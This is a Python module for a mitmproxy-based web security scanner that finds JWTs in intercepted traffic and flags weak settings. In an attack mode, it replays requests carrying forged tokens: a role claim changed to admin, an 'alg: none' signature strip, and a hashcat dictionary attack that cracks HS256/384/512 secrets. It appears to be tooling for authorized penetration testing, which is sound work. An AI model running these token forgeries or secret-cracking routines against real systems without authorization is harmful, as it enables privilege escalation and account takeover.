import base64
from helpers.log import log
import jwt
import json
from mitmproxy import http, ctx
import copy
import subprocess
from pathlib import Path
import re
import threading

class JWTAnalyzer:
    def __init__(self, Helpers, SessionAnalyzer):
        self.SessionAnalyzer = SessionAnalyzer
        self.Helpers = Helpers

    discoveredJWTs = set()
    runningHashcats = []

    BASE_DIR = Path(__file__).resolve().parent
    hashcat = BASE_DIR / "../third-party/hashcat/hashcat.exe"
    rockyouwordlist = BASE_DIR / "../third-party/hashcat/wordlists/seclists/rockyou.txt"
    jwtsecretswordlist = BASE_DIR / "../third-party/wordlists/jwt-secrets/jwt.secrets.list"
    JWTRegex = r"((?:[a-zA-Z0-9_-]+\.){2}[a-zA-Z0-9_-]+)"

    def lookForJWTs(self, flow: http.HTTPFlow):
        
        # start_time = time.time()

        # From Authorization header
        AUTHORIZATION = flow.request.headers.get("Authorization", "")
        if AUTHORIZATION.startswith("Bearer "):
            log.debug("EVALUATING JWT from the Authorization header")
            self.evaluateJWT(AUTHORIZATION.split(" ")[1], flow)

        # From Cookie header
        matches = re.findall(rf"token={JWTAnalyzer.JWTRegex}", flow.request.headers.get("Cookie", ""))
        if len(matches) != 0 and matches[0] is not None:
            log.debug("EVALUATING JWT from the Cookie header")
            for match in matches:
                self.evaluateJWT(match, flow)

        # From URL
        matches = re.findall(rf"token={JWTAnalyzer.JWTRegex}", flow.request.url)
        matches.extend(re.findall(rf"jwt={JWTAnalyzer.JWTRegex}", flow.request.url))

        if len(matches) != 0 and matches[0] is not None:
            log.debug("EVALUATING JWT from the URL")
            for match in matches:
                self.Helpers.logVulnerability(flow, f"JWT found in URL: {match}", flow.request.url)
                self.evaluateJWT(match, flow)
        
        # print("JWTANALYZER, LOOKFORJWTS: --- %s seconds ---" % (time.time() - start_time))
        # self.SessionAnalyzer.timings["jwt"]["time"].append(time.time() - start_time)



    def evaluateJWT(self, JWT, flow):
        if JWT in JWTAnalyzer.discoveredJWTs:
            return
        
        if len(JWT.split(".")) != 3:
            return


        log.info(f"JWT extracted for path {flow.request.url}: {JWT}. Evaluating...")
        JWTAnalyzer.discoveredJWTs.add(JWT)

        try:
            unverifiedHeader = jwt.get_unverified_header(JWT)
            unverifiedPayload = jwt.decode(JWT, options={"verify_signature": False})

            alg = unverifiedHeader.get("alg", "").lower()
            if alg == "none":
                self.Helpers.logWarning(flow, "JWT 'none' algorithm is used by the client", flow.request.url)
            
            if alg == "hs256":
                self.Helpers.logWarning(flow, f"JWT uses symmetric HS256. Risk of secret brute-forcing.", flow.request.url)

            if "exp" not in unverifiedPayload:
                self.Helpers.logWarning(flow, f"JWT is missing an expiration timestamp ('exp' claim)", flow.request.url)

            if ctx.options.useAttackMode == True:
                # Attack no. 1
                sensitiveKeywords = ["password", "secret", "token", "key", "username", "email", "ssn", "role", "admin", "is_admin"]
                lowercasePayload = {
                    k.lower(): copy.deepcopy(v)
                    for k, v in unverifiedPayload.items()
                }

                log.info(lowercasePayload)
                for keyword in sensitiveKeywords:
                    if self.deepJSONContainsKey(lowercasePayload, keyword):
                        self.Helpers.logWarning(flow, f"Potential sensitive data leakage; JWT payload contains keyword '{keyword}': {json.dumps(unverifiedHeader, indent=4)} {json.dumps(lowercasePayload, indent=4)}", flow.request.url)
                        
                        if keyword == "role":
                            _, currentRoleValue = self.deepJSONGetValue(lowercasePayload, keyword)
                            if currentRoleValue != "admin":
                                self.attackClaimChange(flow, JWT, "role", "admin", currentRoleValue)
                            else:
                                log.info("Skipping role change attack. Role already 'admin'")
                
                # Attack no. 2
                self.attackWithAlgNone(flow, JWT)
                # Attack no. 3
                self.attackWithHashcat(flow, JWT)
        
        except Exception as e:
            log.exception(e)

    def deepJSONContainsKey(self, JSON, keyword):
        if isinstance(JSON, dict):
            for k, v in JSON.items():
                if k.lower() == keyword:
                    return True
                if self.deepJSONContainsKey(v, keyword):
                    return True
        elif isinstance(JSON, list):
            for item in JSON:
                if self.deepJSONContainsKey(item, keyword):
                    return True
        return False
    
    def deepJSONSetValue(self, obj, targetKey, newValue):
        if isinstance(obj, dict):
            for k in obj:
                if k.lower() == targetKey.lower():
                    obj[k] = newValue
                    return True
            for v in obj.values():
                if self.deepJSONSetValue(v, targetKey, newValue):
                    return True
        elif isinstance(obj, list):
            for item in obj:
                if self.deepJSONSetValue(item, targetKey, newValue):
                    return True
        return False
    
    def deepJSONGetValue(self, obj, targetKey):
        if isinstance(obj, dict):
            for k, v in obj.items():
                if k.lower() == targetKey.lower():
                    return True, v
                found, val = self.deepJSONGetValue(v, targetKey)
                if found:
                    return found, val
        elif isinstance(obj, list):
            for item in obj:
                found, val = self.deepJSONGetValue(item, targetKey)
                if found:
                    return found, val
        return False, None


    def attackClaimChange(self, flow, JWT, claimToChange, newClaimValue, previousClaimValue):
        log.debug(f"ATTACK: JWT claim {claimToChange} switched to {newClaimValue} from {previousClaimValue}")
        JWTWithClaimChanged = None

        try:
            header64, payload64, signature64 = JWT.split(".")
            paddedPayload = payload64 + "=" * divmod(len(payload64), 4)[1]
            payloadJSON = json.loads(base64.urlsafe_b64decode(paddedPayload))

            modified = self.deepJSONSetValue(payloadJSON, claimToChange, newClaimValue)
            if not modified:
                log.warning(f"Could not find claim '{claimToChange}' in JWT to modify")
                return None

            newPayloadBytes = json.dumps(payloadJSON).encode("utf-8")
            newPayload64 = base64.urlsafe_b64encode(newPayloadBytes).decode("utf-8").rstrip("=")

            JWTWithClaimChanged = f"{header64}.{newPayload64}.{signature64}"

        except Exception as e:
            log.exception(f"Failed to change claim {claimToChange} to {newClaimValue}")
        
        if JWTWithClaimChanged == None:
            log.warning("Could not carry out JWT role change attack")
            return

        attackFlow = flow.copy()

        attackFlow.request.headers["X-Attack"] = "Active-Attack-Claim"
        attackFlow.request.headers["Authorization"] = f"Bearer {JWTWithClaimChanged}"

        # TODO: remove
        attackFlow.metadata["originalStatus"] = flow.response.status_code
        log.info(f"status_code {flow.response.status_code}")
        ctx.master.commands.call("replay.client", [attackFlow])


    # ATTACK: Replay request with algorithm none
    def attackWithAlgNone(self, flow, JWT):
        log.debug("ATTACK: JWT algorithm switched to none")
        JWTwithAlgNone = None

        try:
            header64, payload64, _ = JWT.split(".")
            paddedHeader = header64 + "=" * divmod(len(header64), 4)[1]
            headerJSON = json.loads(base64.urlsafe_b64decode(paddedHeader))

            headerJSON["alg"] = "none"

            newHeaderBytes = json.dumps(headerJSON).encode("utf-8")
            newHeader64 = base64.urlsafe_b64encode(newHeaderBytes).decode("utf-8").rstrip("=")

            JWTwithAlgNone = f"{newHeader64}.{payload64}."

        except Exception as e:
            log.exception(f"Failed to change JWT algorithm to none")

        if JWTwithAlgNone == None:
            log.info("Couldn't carry out JWT 'none' algorithm attack")
            return

        attackFlow = flow.copy()

        attackFlow.request.headers["X-Attack"] = "Active-Attack-AlgNone"
        attackFlow.request.headers["Authorization"] = f"Bearer {JWTwithAlgNone}"

        attackFlow.metadata["originalStatus"] = flow.response.status_code
        log.debug(f"Status code {flow.response.status_code}")
        ctx.master.commands.call("replay.client", [attackFlow])


    def evaluateAttackResponse(self, attackFlow: http.HTTPFlow, attackHeader):
        log.debug("Evaluating attack response")
        originalStatus = attackFlow.metadata.get("originalStatus")
        log.debug(f"Original HTTP status: {originalStatus}")

        attackStatus = attackFlow.response.status_code
        log.debug(f"New HTTP status: {attackStatus}")

        path = attackFlow.request.url

        message = ""
        if attackStatus in [401, 403, 500]:
            match attackHeader:
                case "Active-Attack-AlgNone":
                    message = "rejected 'alg: none' signature bypass"
                case "Active-Attack-Claim":
                    message = "rejected claim change"
                    
            log.info(f"Server successfully {message} on {path} (Status: {attackStatus})")
        elif attackStatus == 200 or attackStatus == originalStatus:
            match attackHeader:
                case "Active-Attack-AlgNone":
                    message = "'alg: none' signature accepted"
                case "Active-Attack-Claim":
                    message = "Role claim change accepted"

            self.Helpers.logVulnerability(attackFlow, f"{message}", path)


    def attackWithHashcat(self, flow, JWT):
        log.debug(f"ATTACK: Checking if Hashcat attack is possible")

        # Checking if the header lists a compatible signing algorithm
        header64, _, _ = JWT.split(".")
        paddedHeader = header64 + "=" * divmod(len(header64), 4)[1]
        headerJSON = json.loads(base64.urlsafe_b64decode(paddedHeader))
        if headerJSON.get("alg", "") == "":
            log.info(f"Skipping Hashcat attack due to no 'alg' attribute in JWT header, {json.dumps(headerJSON, indent=4)}")
            return
        
        algAttribute = headerJSON["alg"].lower()
        
        if not(algAttribute == "hs256" or algAttribute == "hs384" or algAttribute == "hs512"):
            log.info(f"Skipping Hashcat attack due to an incompatible signing algorithm: {algAttribute}")
            return

        try:
            log.info("Starting Hashcat attack")

            with open("hashcatErrors.log", "w") as error_file:
                process = subprocess.Popen(
                    ["./third-party/hashcat/hashcat.exe", # subprocess executing from root folder /third-party/hashcat/
                        "-a", "0",
                        "--potfile-disable",
                        "-m", "16500",
                        JWT,
                        "./wordlists/combinedWordlist.txt"  # relative to the /third-party/hashcat folder
                    ],
                    text=True,
                    cwd="./third-party/hashcat",
                    stdout=subprocess.PIPE,
                    stderr=error_file
                )

                outputThread = threading.Thread(target=self.runAndLogHashcat, args=(process, flow, JWT), daemon=True)
                JWTAnalyzer.runningHashcats.append({"isRunning": 1, "process": process, "threadRef": outputThread}) # 1 = running, 0 = finished

                outputThread.start()
        except Exception as e:
            log.exception("Hashcat attack failed with exception: ", e)

    def runAndLogHashcat(self, process, flow, JWT):
        try:
            self.logHashcatOutput(process, flow, JWT)
        finally:
            self.hashcatFinished(process)

    def logHashcatOutput(self, process, flow, JWT):
        fullHashcatOutput = ""

        for line in process.stdout:
            log.hashcat(line.rstrip("\r\n"))
            fullHashcatOutput += line

            if("Status...........: Cracked" in line):
                match = re.search(f"(?<={JWT}:)\\S*", fullHashcatOutput)
                if match:
                    match = match.group(0)
                else:
                    match = ""
                self.Helpers.logVulnerability(flow, f"JWT secret brute-forced: '{match}'", flow.request.url)
            elif("Status...........: Exhausted" in line):
                log.info("Hashcat dictionary attack couldn't find a matching secret")


    def hashcatFinished(self, process):
        for entry in JWTAnalyzer.runningHashcats:
            if entry["process"] == process:
                entry["isRunning"] = 0
                log.debug("Cleaning hashcat process")
                break
        
